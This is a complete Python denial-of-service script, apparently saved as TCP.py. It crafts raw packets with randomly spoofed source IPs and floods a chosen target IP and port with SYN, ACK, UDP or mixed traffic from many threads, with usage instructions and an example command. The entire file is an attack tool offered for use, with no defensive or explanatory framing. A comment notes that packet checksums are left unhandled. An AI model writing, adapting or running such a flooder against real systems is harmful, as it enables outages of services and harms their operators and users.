import socket
import threading
import time
import struct
import random
import sys

class DDoSAttack:
    def __init__(self, target_ip, target_port, duration, threads, attack_type):
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.threads = threads
        self.attack_type = attack_type
        self.running = True

    def rand_ip(self):
        return socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))

    def build_syn_packet(self, source_ip):
        # Simplified example - no checksum handling
        ip_header = struct.pack(
            '!BBHHHBBH4s4s', 
            0x45, 0, 40, random.randint(1, 65535), 0, 64, socket.IPPROTO_TCP, 0,
            socket.inet_aton(source_ip), socket.inet_aton(self.target_ip)
        )
        tcp_header = struct.pack(
            '!HHLLBBHHH', 
            random.randint(1024, 65535), self.target_port, random.randint(0, 4294967295), 0,
            0x50, 0x02, 5840, 0, 0
        )
        return ip_header + tcp_header

    def build_ack_packet(self, source_ip):
        ip_header = struct.pack(
            '!BBHHHBBH4s4s', 
            0x45, 0, 40, random.randint(1, 65535), 0, 64, socket.IPPROTO_TCP, 0,
            socket.inet_aton(source_ip), socket.inet_aton(self.target_ip)
        )
        tcp_header = struct.pack(
            '!HHLLBBHHH', 
            random.randint(1024, 65535), self.target_port, random.randint(0, 4294967295), 0,
            0x50, 0x10, 5840, 0, 0
        )
        return ip_header + tcp_header

    def build_udp_packet(self, source_ip):
        ip_header = struct.pack(
            '!BBHHHBBH4s4s', 
            0x45, 0, 28, random.randint(1, 65535), 0, 64, socket.IPPROTO_UDP, 0,
            socket.inet_aton(source_ip), socket.inet_aton(self.target_ip)
        )
        udp_header = struct.pack(
            '!HHHH', 
            random.randint(1024, 65535), self.target_port, 8, 0
        )
        return ip_header + udp_header

    def send_packet(self, packet):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            sock.sendto(packet, (self.target_ip, 0))
        except PermissionError:
            print("Error: Raw sockets require administrator/root privileges.")
            sys.exit(1)
        except Exception as e:
            print(f"Error sending packet: {e}")

    def attack(self):
        end_time = time.time() + self.duration
        while time.time() < end_time:
            if not self.running:
                break
            source_ip = self.rand_ip()
            if self.attack_type == "syn":
                packet = self.build_syn_packet(source_ip)
            elif self.attack_type == "ack":
                packet = self.build_ack_packet(source_ip)
            elif self.attack_type == "udp":
                packet = self.build_udp_packet(source_ip)
            elif self.attack_type == "mixed":
                packet_type = random.choice(["syn", "ack", "udp"])
                if packet_type == "syn":
                    packet = self.build_syn_packet(source_ip)
                elif packet_type == "ack":
                    packet = self.build_ack_packet(source_ip)
                else:
                    packet = self.build_udp_packet(source_ip)
            self.send_packet(packet)

    def start(self):
        threads = []
        for _ in range(self.threads):
            thread = threading.Thread(target=self.attack)
            thread.daemon = True  # Allow main thread to exit while daemon threads run
            thread.start()
            threads.append(thread)
        for thread in threads:
            thread.join()

if __name__ == "__main__":
    if len(sys.argv) < 6:
        print(""" 
Usage: python3 TCP.py Target Port Threads Duration AttackType
Example: python3 TCP.py 192.168.1.1 80 10 60 mixed

Attack Type = syn / ack / udp / mixed
""")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    threads = int(sys.argv[3])
    duration = int(sys.argv[4])
    attack_type = sys.argv[5]

    ddos = DDoSAttack(target_ip, target_port, duration, threads, attack_type)
    ddos.start()
                             
